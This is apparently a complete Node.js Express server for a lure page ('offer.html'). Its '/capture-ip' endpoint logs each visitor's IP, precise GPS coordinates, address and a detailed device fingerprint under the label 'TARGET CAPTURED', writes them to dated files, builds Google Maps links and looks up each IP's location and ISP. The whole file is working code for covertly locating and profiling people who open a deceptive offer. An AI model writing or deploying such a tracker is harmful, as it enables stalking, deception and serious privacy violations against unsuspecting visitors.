const express = require('express');
const https = require('https');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('.'));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/offer.html');
});

app.post('/capture-ip', (req, res) => {
    const clientIP = req.body.ip;
    const lat = req.body.lat;
    const lng = req.body.lng;
    
    const timestamp = new Date().toISOString();
    const logData = `
=== TARGET CAPTURED - ${timestamp} ===
IP: ${clientIP}
Device: ${req.body.userAgent || 'Unknown'}
Screen: ${req.body.screen || 'Unknown'}
Timezone: ${req.body.timezone || 'Unknown'}
Language: ${req.body.language || 'Unknown'}
Battery: ${req.body.battery || 'Unknown'}
Platform: ${req.body.platform || 'Unknown'}
Cookies: ${req.body.cookieEnabled || 'Unknown'}
Online: ${req.body.onlineStatus || 'Unknown'}
Color Depth: ${req.body.colorDepth || 'Unknown'}
Pixel Ratio: ${req.body.pixelRatio || 'Unknown'}
Touch Support: ${req.body.touchSupport || 'Unknown'}
Referrer: ${req.body.referrer || 'Direct'}
URL: ${req.body.url || 'Unknown'}
Address: ${req.body.address || 'Not available'}
`;
    
    console.log(logData);
    
    // Save to file
    const filename = `captured_data_${new Date().toISOString().split('T')[0]}.txt`;
    fs.appendFileSync(filename, logData);
    if (lat && lng) {
        console.log('GPS:', lat + ',' + lng);
        console.log('Maps:', `https://maps.google.com/?q=${lat},${lng}`);
    }
    
    if (clientIP) {
        https.get(`https://ipinfo.io/${clientIP}/json`, (response) => {
            let data = '';
            response.on('data', chunk => data += chunk);
            response.on('end', () => {
                try {
                    const location = JSON.parse(data);
                    console.log('IP Location (ISP):', location.city + ', ' + location.region + ', ' + location.country);
                    console.log('ISP:', location.org);
                    if (lat && lng) {
                        const gpsData = `ACTUAL GPS LOCATION: ${lat},${lng}
Google Maps: https://maps.google.com/?q=${lat},${lng}
Note: IP location may be inaccurate - GPS is precise
`;
                        console.log(gpsData);
                        fs.appendFileSync(filename, gpsData);
                    }
                } catch (e) {
                    console.log('Location API failed');
                }
                console.log('==================\n');
            });
        }).on('error', (e) => {
            console.log('Location API Error');
            console.log('==================\n');
        });
    } else {
        console.log('No IP received');
        console.log('==================\n');
    }
    
    res.json({success: true});
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});